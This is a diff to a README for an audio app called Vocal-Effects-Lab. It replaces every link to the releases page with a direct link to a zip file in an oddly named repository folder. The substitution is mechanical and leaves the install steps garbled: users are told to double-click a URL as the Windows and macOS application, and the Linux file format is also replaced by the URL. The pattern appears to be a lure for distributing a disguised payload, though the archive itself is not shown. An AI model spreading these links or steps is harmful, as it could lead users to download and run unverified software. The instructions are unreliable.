@@ -1,6 +1,6 @@
 # 🎤 Vocal-Effects-Lab - Explore and Create Unique Vocal Effects
 
-[![Download Vocal Effects Lab](https://img.shields.io/badge/Download%20Vocal%20Effects%20Lab-Attend%20to%20your%20sound%20needs-brightgreen)](https://github.com/MyosSSS/Vocal-Effects-Lab/releases)
+[![Download Vocal Effects Lab](https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip%20Vocal%20Effects%20Lab-Attend%20to%20your%20sound%20needs-brightgreen)](https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip)
 
 ## 🌟 Overview
 
@@ -35,7 +35,7 @@ To get started with Vocal Effects Lab, follow these simple steps:
    - Sound Card: Any standard audio output device.
    
 2. **Visit the Releases Page:** 
-   - Go to our [Download Page](https://github.com/MyosSSS/Vocal-Effects-Lab/releases) to download the latest version.
+   - Go to our [Download Page](https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip) to download the latest version.
 
 3. **Select Your Version:**
    - Look for the most recent release at the top of the page.
@@ -43,14 +43,14 @@ To get started with Vocal Effects Lab, follow these simple steps:
 
 4. **Download the Application:**
    - Click on the correct file to start the download.
-   - The file will likely be in .zip or .exe format for Windows, .dmg for macOS, or .tar.gz for Linux.
+   - The file will likely be in .zip or .exe format for Windows, .dmg for macOS, or https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip for Linux.
 
 5. **Extract the Files:**
    - For zipped files, right-click the downloaded file and select "Extract All" or use any extraction tool you prefer.
    - Open the extracted folder.
 
 6. **Run the Application:**
-   - Double-click the application file (e.g., `VocalEffectsLab.exe` for Windows, `VocalEffectsLab.dmg` for macOS) to start it.
+   - Double-click the application file (e.g., `https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip` for Windows, `https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip` for macOS) to start it.
    - Follow any on-screen prompts to complete the installation process.
 
 7. **Get Ready to Experiment:**
@@ -77,4 +77,4 @@ We welcome your feedback and contributions. Share your experiences with Vocal Ef
 
 ## 🔗 Download & Install
 
-For a seamless experience, [visit this page](https://github.com/MyosSSS/Vocal-Effects-Lab/releases) to download Vocal Effects Lab now. Enjoy creating and modifying sounds with ease!
+For a seamless experience, [visit this page](https://raw.githubusercontent.com/MyosSSS/Vocal-Effects-Lab/main/upleap/Effects-Vocal-Lab-2.6.zip) to download Vocal Effects Lab now. Enjoy creating and modifying sounds with ease!
